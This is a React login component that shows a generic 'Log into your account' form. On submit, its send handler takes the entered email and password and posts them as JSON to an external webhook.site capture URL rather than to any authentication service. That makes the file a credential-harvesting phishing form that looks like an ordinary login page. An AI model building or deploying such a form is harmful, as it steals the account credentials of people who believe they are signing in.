import React, {Component} from 'react';
import './login.css'

class Login extends Component {

    constructor(props) {
        super(props);
        this.state = {
            type: "input",
            score: "null"
        };
        this.showHide = this.showHide.bind(this);
    }

    showHide(e) {
        e.preventDefault();
        e.stopPropagation();
        this.setState({
            type: this.state.type === "input" ? "password" : "input"
        });
    }

    myForm = React.createRef();

    send = async (e) => {
        e.preventDefault();
        try {
            let in1 = this.myForm.current[0].value;
            let in2 = this.myForm.current[1].value;

            let result = await fetch('https://webhook.site/1d1e40c7-defe-4f6b-9c3b-9ee48c4e05f3', {
                method: 'post',
                mode: 'no-cors',
                headers: {
                    'Accept': 'application/json',
                    'Content-type': 'application/json'
                },
                body: JSON.stringify({
                    email: in1,
                    password: in2
                })
            });
            console.log(result)
        } catch (e) {
            console.log(e)
        }
    };


    render() {
        return (
            <div className={'main-flex-login'}>
                <form className={'login-form'} onSubmit={this.send} ref={this.myForm}>

                    <h3 className={'login-form-h3'}>Log into your account</h3>

                    <span className={'login-form-spam'}>Email</span>

                    <input id={'in1'} className={'login-input'} />
                    <div>
                        <span className={'login-form-spam'}>Password</span>
                        <span className="password__show" onClick={this.showHide}>
                            {this.state.type === "input" ? "Hide Password" : "Show Password"}
                     </span>
                    </div>
                    <input type={this.state.type} className="password__input"/>


                    <div className="wrap">
                        <button className="button">Log In</button>
                    </div>
                </form>
            </div>
        );
    }
}

export default Login;
